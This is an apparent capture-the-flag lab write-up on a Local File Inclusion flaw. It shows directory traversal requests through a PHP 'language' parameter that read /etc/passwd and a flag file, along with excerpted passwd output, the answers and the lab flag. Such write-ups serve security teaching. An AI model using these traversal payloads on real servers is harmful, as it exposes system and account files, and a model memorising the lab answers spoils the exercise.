# Local File Inclusion - Lab Writeup

## [¤] Operation Log (Proof of Concept)

```yaml
Target Host: 10.129.x.x
System/OS: Linux / Windows
Objective: Find the Flag
Vulnerability: Local File Inclusion
```

### 1. Reconnaissance & Foothold
- **Identified Parameter**: `language` (e.g., `/index.php?language=`)
- **Initial Analysis**:
  - Testing `/index.php?language=` and `/index.php?language=/etc/passwd` returned an empty response. This suggested that the application is prefixing a relative path and does not support direct absolute paths without directory traversal.
- **Proof of Concept (LFI)**:
  - Directory traversal sequences were used to climb up to the root directory:
    ```http
    GET /index.php?language=../../../../etc/passwd HTTP/1.1
    ```
  - **Result**: The `/etc/passwd` file was successfully rendered on the page, confirming the Local File Inclusion vulnerability.

### 2. Exploitation (Retrieving the Flag)

#### Question 1: Username starting with 'b'
Analyzing the content of `/etc/passwd` obtained in the previous step:
```text
root:x:0:0:root:/root:/bin/bash
...
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
barry:x:1000:1000::/home/barry:/bin/sh
```
- The local user **`barry`** was identified as the only user starting with 'b'.

#### Question 2: Locate the Flag in `/usr/share/flags`
- Since the flag is located at `/usr/share/flags/flag.txt`, the same Path Traversal vector was used to read the file:
  ```http
  GET /index.php?language=../../../../usr/share/flags/flag.txt HTTP/1.1
  ```
- **Result**: The flag was successfully read and rendered on the page.

### 3. Post-Mortem & Flag
* **Flag**: `HTB{n3v3r_tru$t_u$3r_!nput}`
* **Lessons Learned**:
  - If absolute paths fail initially, always test directory traversal sequences (`../../`) because the application might prefix inputs with a default base folder (e.g., `templates/`).
